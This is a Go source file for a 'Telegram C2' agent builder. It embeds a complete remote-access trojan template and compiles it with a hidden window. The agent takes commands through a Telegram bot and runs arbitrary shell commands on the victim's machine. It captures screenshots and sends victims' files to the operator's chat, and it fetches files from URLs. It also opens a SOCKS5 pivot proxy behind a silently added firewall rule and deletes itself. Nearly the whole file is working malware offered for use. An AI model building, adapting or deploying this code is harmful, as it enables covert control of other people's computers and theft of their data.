package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

const AGENT_TPL = `package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"sync"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode/utf8"

	"image/png"
	"mime/multipart"

	"github.com/kbinani/screenshot"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

const (
	apiBase   = "https://api.telegram.org/bot"
	msgMaxLen = 4096
)

var (
	token      = "__TOKEN__"
	chatIDStr  = "__CHAT_ID__"
	proxyURL   = "__PROXY__"
	agentID    = "__AGENT_ID__"
)

var chatID int64

// SOCKS proxy state
var (
	socksRunning  bool
	socksListener net.Listener
	socksPort     int
	socksPassword string
	socksMu       sync.Mutex
)

func httpClient() *http.Client {
	if proxyURL != "" {
		u, _ := url.Parse(proxyURL)
		return &http.Client{
			Transport: &http.Transport{Proxy: http.ProxyURL(u)},
			Timeout:   30 * time.Second,
		}
	}
	return &http.Client{Timeout: 30 * time.Second}
}

func sendMsg(text string) {
	body, _ := json.Marshal(map[string]interface{}{"chat_id": chatID, "text": text})
	req, _ := http.NewRequest("POST", apiBase+token+"/sendMessage", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := httpClient().Do(req)
	if err == nil { resp.Body.Close() }
}

func getUpdates(offset int) []map[string]interface{} {
	u := fmt.Sprintf("%s/getUpdates?offset=%d&timeout=10", apiBase+token, offset)
	req, _ := http.NewRequest("GET", u, nil)
	resp, err := httpClient().Do(req)
	if err != nil { return nil }
	defer resp.Body.Close()
	var r map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&r)
	if r == nil || r["ok"] != true { return nil }
	result, _ := r["result"].([]interface{})
	if result == nil { return nil }
	var updates []map[string]interface{}
	for _, u := range result {
		if m, ok := u.(map[string]interface{}); ok { updates = append(updates, m) }
	}
	return updates
}

func gbkToUTF8(raw []byte) string {
	if utf8.Valid(raw) { return string(raw) }
	dec := simplifiedchinese.GBK.NewDecoder()
	out, _, err := transform.Bytes(dec, raw)
	if err != nil { return string(raw) }
	return string(out)
}

func screenshotPNG() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n < 1 { return nil, fmt.Errorf("no displays") }
	img, err := screenshot.CaptureDisplay(0)
	if err != nil { return nil, err }
	buf := new(bytes.Buffer)
	if err := png.Encode(buf, img); err != nil { return nil, err }
	return buf.Bytes(), nil
}

func sendPhoto(imgBytes []byte, caption string) {
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	writer.WriteField("chat_id", fmt.Sprintf("%d", chatID))
	if caption != "" {
		writer.WriteField("caption", caption)
	}
	part, _ := writer.CreateFormFile("photo", "screenshot.png")
	part.Write(imgBytes)
	writer.Close()

	req, _ := http.NewRequest("POST", apiBase+token+"/sendPhoto", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := httpClient().Do(req)
	if err == nil { resp.Body.Close() }
}

func sendFile(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		sendMsg(fmt.Sprintf("[ERR] read: %v", err))
		return
	}
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	writer.WriteField("chat_id", fmt.Sprintf("%d", chatID))
	part, _ := writer.CreateFormFile("document", filepath.Base(path))
	part.Write(data)
	writer.Close()

	req, _ := http.NewRequest("POST", apiBase+token+"/sendDocument", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := httpClient().Do(req)
	if err == nil { resp.Body.Close() }
}

func firewallAllow(port int) {
	if runtime.GOOS != "windows" { return }
	exe, _ := os.Executable()
	if exe == "" { return }
	cmd := exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		"name=TelegramC2_SOCKS", "dir=in", "action=allow",
		"program="+exe, "localport="+strconv.Itoa(port),
		"protocol=tcp", "enable=yes")
	// HideWindow is Windows-only; use reflect to avoid cross-compile errors
		attr := &syscall.SysProcAttr{}
		if runtime.GOOS == "windows" {
			// Set HideWindow via reflect (field exists on Windows, not on Linux)
			reflect.ValueOf(attr).Elem().FieldByName("HideWindow").SetBool(true)
		}
		cmd.SysProcAttr = attr
	cmd.Run()
}

func firewallRemove() {
	if runtime.GOOS != "windows" { return }
	cmd := exec.Command("netsh", "advfirewall", "firewall", "delete", "rule",
		"name=TelegramC2_SOCKS")
	// HideWindow is Windows-only; use reflect to avoid cross-compile errors
		attr := &syscall.SysProcAttr{}
		if runtime.GOOS == "windows" {
			// Set HideWindow via reflect (field exists on Windows, not on Linux)
			reflect.ValueOf(attr).Elem().FieldByName("HideWindow").SetBool(true)
		}
		cmd.SysProcAttr = attr
	cmd.Run()
}

func startSOCKS(port int, password string) error {
	socksMu.Lock()
	defer socksMu.Unlock()

	if socksRunning {
		return fmt.Errorf("SOCKS already running on port %d", socksPort)
	}

	firewallAllow(port)
	addr := fmt.Sprintf("0.0.0.0:%d", port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen: %v", err)
	}

	socksRunning = true
	socksListener = listener
	socksPort = port
	socksPassword = password

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				if !socksRunning { break }
				continue
			}
			go socksHandleConn(conn)
		}
	}()

	return nil
}

func stopSOCKS() {
	socksMu.Lock()
	defer socksMu.Unlock()
	if socksRunning {
		socksListener.Close()
		socksRunning = false
		sendMsg(fmt.Sprintf("[SOCKS] stopped on port %d", socksPort))
	}
}

func socksHandleConn(conn net.Conn) {
	defer conn.Close()

	// 1. Auth negotiation
	_, err := socksReadMethods(conn)
	if err != nil { return }

	// Choose method: 0x02 = user/pass, 0x00 = no auth
	method := byte(0x00)
	if socksPassword != "" {
		method = 0x02
		conn.Write([]byte{0x05, method})
		// Verify password
		if !socksVerifyPassword(conn, socksPassword) {
			conn.Write([]byte{0x01, 0x01}) // auth failed
			return
		}
		conn.Write([]byte{0x01, 0x00}) // auth success
	} else {
		conn.Write([]byte{0x05, method})
	}

	// 2. Read CONNECT request
	req := make([]byte, 4)
	if _, err := io.ReadFull(conn, req); err != nil { return }
	if req[0] != 0x05 || req[1] != 0x01 { return } // Only CONNECT

	// 3. Read address
	host, port, err := socksReadAddr(conn, req[3])
	if err != nil { return }

	// 4. Connect to target
	target, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
	if err != nil {
		socksSendReply(conn, 0x04, nil) // host unreachable
		return
	}
	defer target.Close()

	// 5. Send success reply
	socksSendReply(conn, 0x00, target.LocalAddr().(*net.TCPAddr))

	// 6. Bidirectional relay
	go io.Copy(target, conn)
	io.Copy(conn, target)
}

func socksReadMethods(conn net.Conn) ([]byte, error) {
	header := make([]byte, 2)
	if _, err := io.ReadFull(conn, header); err != nil { return nil, err }
	if header[0] != 0x05 { return nil, fmt.Errorf("not SOCKS5") }
	n := int(header[1])
	methods := make([]byte, n)
	if _, err := io.ReadFull(conn, methods); err != nil { return nil, err }
	return methods, nil
}

func socksVerifyPassword(conn net.Conn, expected string) bool {
	// Read SOCKS5 password auth subnegotiation
	header := make([]byte, 2)
	if _, err := io.ReadFull(conn, header); err != nil { return false }
	if header[0] != 0x01 { return false }
	ulen := int(header[1])
	uname := make([]byte, ulen)
	if _, err := io.ReadFull(conn, uname); err != nil { return false }
	header2 := make([]byte, 1)
	if _, err := io.ReadFull(conn, header2); err != nil { return false }
	plen := int(header2[0])
	pass := make([]byte, plen)
	if _, err := io.ReadFull(conn, pass); err != nil { return false }

	return string(pass) == expected
}

func socksReadAddr(conn net.Conn, atyp byte) (string, int, error) {
	switch atyp {
	case 0x01: // IPv4
		addr := make([]byte, 4)
		if _, err := io.ReadFull(conn, addr); err != nil { return "", 0, err }
		port := make([]byte, 2)
		if _, err := io.ReadFull(conn, port); err != nil { return "", 0, err }
		return fmt.Sprintf("%d.%d.%d.%d", addr[0], addr[1], addr[2], addr[3]),
			int(port[0])<<8 | int(port[1]), nil
	case 0x03: // Domain
		lenByte := make([]byte, 1)
		if _, err := io.ReadFull(conn, lenByte); err != nil { return "", 0, err }
		domain := make([]byte, int(lenByte[0]))
		if _, err := io.ReadFull(conn, domain); err != nil { return "", 0, err }
		port := make([]byte, 2)
		if _, err := io.ReadFull(conn, port); err != nil { return "", 0, err }
		return string(domain), int(port[0])<<8 | int(port[1]), nil
	case 0x04: // IPv6
		return "", 0, fmt.Errorf("IPv6 not supported")
	}
	return "", 0, fmt.Errorf("unknown address type: %d", atyp)
}

func socksSendReply(conn net.Conn, rep byte, addr *net.TCPAddr) {
	var atyp byte = 0x01
	var bindAddr []byte
	if addr != nil {
		ip := addr.IP
		if ip4 := ip.To4(); ip4 != nil {
			atyp = 0x01
			bindAddr = ip4
		} else {
			atyp = 0x04
			bindAddr = ip.To16()
		}
	} else {
		bindAddr = []byte{0, 0, 0, 0}
	}
	port := uint16(0)
	if addr != nil { port = uint16(addr.Port) }
	reply := []byte{0x05, rep, 0x00, atyp}
	reply = append(reply, bindAddr...)
	reply = append(reply, byte(port>>8), byte(port))
	conn.Write(reply)
}

func selfDelete() {
	exe, _ := os.Executable()
	if exe == "" { return }
	if runtime.GOOS == "windows" {
		// Windows: bat 延时删除
		cr := fmt.Sprintf("%c", 13)
		lf := fmt.Sprintf("%c", 10)
		crlf := cr + lf
		var buf strings.Builder
		buf.WriteString("@echo off" + crlf)
		buf.WriteString(":loop" + crlf)
		buf.WriteString("del " + exe + crlf)
		buf.WriteString("if exist " + exe + " goto loop" + crlf)
		buf.WriteString("del %~f0" + crlf)
		batPath := filepath.Join(os.TempDir(), "del_"+strconv.Itoa(os.Getpid())+".bat")
		os.WriteFile(batPath, []byte(buf.String()), 0644)
		exec.Command("cmd.exe", "/c", "start", "/b", batPath).Start()
	} else {
		// Linux/macOS: sh -c 延时删除
		exec.Command("sh", "-c", "sleep 1 && rm -f \""+exe+"\"").Start()
	}
}

func execCmd(cmdStr string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
	cmd = exec.Command("cmd.exe", "/c", cmdStr)
		// HideWindow is Windows-only; use reflect to avoid cross-compile errors
		attr := &syscall.SysProcAttr{}
		if runtime.GOOS == "windows" {
			// Set HideWindow via reflect (field exists on Windows, not on Linux)
			reflect.ValueOf(attr).Elem().FieldByName("HideWindow").SetBool(true)
		}
		cmd.SysProcAttr = attr
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	result := strings.TrimSpace(gbkToUTF8(out))
	if err != nil {
		return fmt.Sprintf("[!] exit %v\n%s", err, result)
	}
	if result == "" { return "(done)" }
	return result
}

func hostname() string { h, _ := os.Hostname(); return h }
func username() string {
	u := os.Getenv("USERNAME")
	if u == "" { u = os.Getenv("USER") }
	if u == "" { u = "unknown" }
	return u
}

func handleCommand(cmd string) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" { return }
	switch {
	case strings.EqualFold(cmd, "exit"):
		sendMsg("[BYE] Agent shutting down"); os.Exit(0)
	case strings.EqualFold(cmd, "info"):
		sendMsg(fmt.Sprintf("[INFO] %s | %s | %s %s | PID:%d", hostname(), username(), runtime.GOOS, runtime.GOARCH, os.Getpid()))
	case strings.EqualFold(cmd, "pwd"):
		d, _ := os.Getwd(); sendMsg(fmt.Sprintf("[PWD] %s", d))
	case strings.HasPrefix(strings.ToLower(cmd), "cd "):
		if err := os.Chdir(strings.TrimSpace(cmd[3:])); err != nil {
			sendMsg(fmt.Sprintf("[ERR] cd: %v", err))
		} else { d, _ := os.Getwd(); sendMsg(fmt.Sprintf("[PWD] %s", d)) }
	case strings.EqualFold(cmd, "sessions"):
		sendMsg(fmt.Sprintf("[%s] %s:%s | %s", agentID, hostname(), username(), runtime.GOOS))
	case strings.EqualFold(cmd, "screenshot"):
			img, err := screenshotPNG()
			if err != nil {
				sendMsg(fmt.Sprintf("[ERR] screenshot: %v", err))
			} else {
				sendPhoto(img, "")
				sendMsg("[OK] screenshot sent")
			}
		case strings.HasPrefix(strings.ToLower(cmd), "download "):
			path := strings.Trim(strings.TrimSpace(cmd[9:]), "\"'")
			if path == "" {
				sendMsg("[ERR] download <path>")
			} else {
				sendFile(path)
				sendMsg(fmt.Sprintf("[OK] download: %s", path))
			}
		case strings.HasPrefix(strings.ToLower(cmd), "upload "):
			url := strings.Trim(strings.TrimSpace(cmd[7:]), "\"'")
			if !strings.HasPrefix(url, "http") {
				sendMsg("[ERR] upload <url>")
			} else {
				resp, err := httpClient().Get(url)
				if err != nil {
					sendMsg(fmt.Sprintf("[ERR] get: %v", err))
				} else {
					defer resp.Body.Close()
					fname := filepath.Base(url)
					if fname == "" || fname == "." || fname == "/" { fname = "downloaded" }
					data, _ := io.ReadAll(resp.Body)
					os.WriteFile(fname, data, 0644)
					sendMsg(fmt.Sprintf("[OK] downloaded %s (%d bytes)", fname, len(data)))
				}
			}
		case strings.HasPrefix(strings.ToLower(cmd), "socks on"):
			// socks on [port] [--pass password]
			parts := strings.Fields(cmd)
			port := 1984
			pass := ""
			for i, p := range parts {
				if p == "--pass" && i+1 < len(parts) { pass = parts[i+1] }
			}
			if len(parts) >= 3 && parts[2] != "--pass" {
				if p, err := strconv.Atoi(parts[2]); err == nil { port = p }
			}
			if err := startSOCKS(port, pass); err != nil {
				sendMsg(fmt.Sprintf("[ERR] SOCKS: %v", err))
			} else {
				sendMsg(fmt.Sprintf("[SOCKS] started on 0.0.0.0:%d (pass=%s)", port, map[bool]string{true:"yes",false:"no"}[pass!=""]))
			}
		case strings.EqualFold(cmd, "socks off"):
			stopSOCKS()
		case strings.EqualFold(cmd, "socks status"):
			socksMu.Lock()
			r := socksRunning
			p := socksPort
			socksMu.Unlock()
			if r {
				sendMsg(fmt.Sprintf("[SOCKS] running on 0.0.0.0:%d", p))
			} else {
				sendMsg("[SOCKS] not running")
			}
			default:
		out := execCmd(cmd)
		if len(out) > msgMaxLen { out = out[:msgMaxLen-50] + "\n...(truncated)" }
		sendMsg(fmt.Sprintf("'''\n%s\n'''", out))
	}
}

func main() {
	cid, err := strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil { return }
	chatID = cid

	// Generate short ID from hostname first letter
	sendMsg(fmt.Sprintf("[ON] Agent online | [%s] %s:%s | %s", agentID, hostname(), username(), runtime.GOOS))

	last := 0
	startTime := time.Now().Unix()
	for {
		updates := getUpdates(last + 1)
		if updates != nil {
			for _, upd := range updates {
				id, _ := upd["update_id"].(float64)
				if int(id) > last { last = int(id) }
				msg, _ := upd["message"].(map[string]interface{})
				if msg == nil { continue }
				from, _ := msg["from"].(map[string]interface{})
				if from != nil {
					isBot, _ := from["is_bot"].(bool)
					if isBot { continue }
				}
				chat, _ := msg["chat"].(map[string]interface{})
				if chat == nil { continue }
				cid, _ := chat["id"].(float64)
				if int64(cid) != chatID { continue }
				// Skip messages sent before this agent started (avoid re-processing old commands)
				msgDate, _ := msg["date"].(float64)
				if int64(msgDate) < startTime { continue }
				raw, _ := msg["text"].(string)
				raw = strings.TrimSpace(raw)
				if raw == "" { continue }

				// Strip leading / for BotFather command menu compatibility
				parsed := strings.TrimPrefix(raw, "/")
				// parse [X] prefix routing (supports single-char IDs like [A] and multi-char like [AB])
				cmd := parsed
				if len(parsed) >= 3 && parsed[0] == '[' {
					closeIdx := strings.Index(parsed, "]")
					if closeIdx > 0 {
						prefixID := parsed[1:closeIdx]
						if prefixID == agentID {
							cmd = strings.TrimSpace(parsed[closeIdx+1:])
						} else {
							continue
						}
					}
				}
				// Strip leading / again in case of [X] /command format
				cmd = strings.TrimPrefix(cmd, "/")
				handleCommand(cmd)
			}
		}
		time.Sleep(2 * time.Second)
	}
}
`

func main() {
	fmt.Println()
	fmt.Println("=======================================================")
	fmt.Println("  Telegram C2 — Go Agent Builder")
	fmt.Println("  改 Agent 逻辑只需改 build_agent.go 中的 AGENT_TPL")
	fmt.Println("=======================================================")
	fmt.Println()

	reader := bufio.NewReader(os.Stdin)

	token := ask(reader, "Bot Token")
	if token == "" { fmt.Println("[!] 不能为空"); os.Exit(1) }

	chatID := ask(reader, "Chat ID")
	if chatID == "" { fmt.Println("[!] 不能为空"); os.Exit(1) }

	proxy := ask(reader, "Proxy (回车跳过)")
	agentID := askDefault(reader, "Agent ID (A/B/C...)", "A")
	exeName := askDefault(reader, "exe 文件名", "tg_agent")
	platform := askDefault(reader, "目标平台 (windows/linux/macos)", "windows")
	fmt.Println()

	// 注入配置
	code := AGENT_TPL
	code = strings.ReplaceAll(code, "__TOKEN__", token)
	code = strings.ReplaceAll(code, "__CHAT_ID__", chatID)
	code = strings.ReplaceAll(code, "__PROXY__", proxy)
	code = strings.ReplaceAll(code, "__AGENT_ID__", agentID)
	
	// 写入临时文件
	selfDir := getSelfDir()
	buildDir := filepath.Join(os.TempDir(), "tg_c2_build_"+strconv.Itoa(os.Getpid()))
	os.MkdirAll(buildDir, 0755)
	srcPath := filepath.Join(buildDir, "main.go")
	os.WriteFile(srcPath, []byte(code), 0644)

	// 复制 go.mod, go.sum 到临时目录 (确保依赖可用)
	modSrc := filepath.Join(selfDir, "go.mod")
	modDst := filepath.Join(buildDir, "go.mod")
	sumSrc := filepath.Join(selfDir, "go.sum")
	sumDst := filepath.Join(buildDir, "go.sum")
	if data, err := os.ReadFile(modSrc); err == nil {
		os.WriteFile(modDst, data, 0644)
	}
	if data, err := os.ReadFile(sumSrc); err == nil {
		os.WriteFile(sumDst, data, 0644)
	}

	// 编译
	outputDir := filepath.Join(selfDir, "dist")
	os.MkdirAll(outputDir, 0755)
	ext := ".exe"
	goos := "windows"
	ldflags := "-s -w -H=windowsgui"
	switch platform {
	case "linux":
		ext = ""; goos = "linux"; ldflags = "-s -w"
	case "macos":
		ext = ""; goos = "darwin"; ldflags = "-s -w"
	}
	exePath := filepath.Join(outputDir, exeName+ext)

	fmt.Printf("[*] go build (GOOS=%s) -o %s\n", goos, exePath)
	cmd := exec.Command("go", "build", "-ldflags="+ldflags, "-o", exePath, srcPath)
	cmd.Env = append(os.Environ(),
		"GOOS="+goos, "GOARCH=amd64",
		"GOPROXY=https://goproxy.io,direct")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Printf("[!] 编译失败: %v\n", err)
		os.Exit(1)
	}
	if info, err := os.Stat(exePath); err == nil {
		sizeMB := float64(info.Size()) / (1024 * 1024)
		fmt.Printf("[+] OK: %s (%.1f MB)\n", exePath, sizeMB)
	} else {
		fmt.Println("[!] 未找到编译产物")
	}
	os.RemoveAll(buildDir)
	fmt.Println(strings.Repeat("=", 55))
}

func ask(r *bufio.Reader, p string) string {
	fmt.Printf("%s: ", p)
	t, _ := r.ReadString('\n'); return strings.TrimSpace(t)
}

func askDefault(r *bufio.Reader, p, d string) string {
	fmt.Printf("%s [%s]: ", p, d)
	t, _ := r.ReadString('\n'); t = strings.TrimSpace(t)
	if t == "" { return d }; return t
}

func getSelfDir() string {
	exe, err := os.Executable()
	if err == nil {
		d := filepath.Dir(exe)
		if filepath.Base(d) == "dist" { return filepath.Dir(d) }
		return d
	}
	d, _ := os.Getwd(); return d
}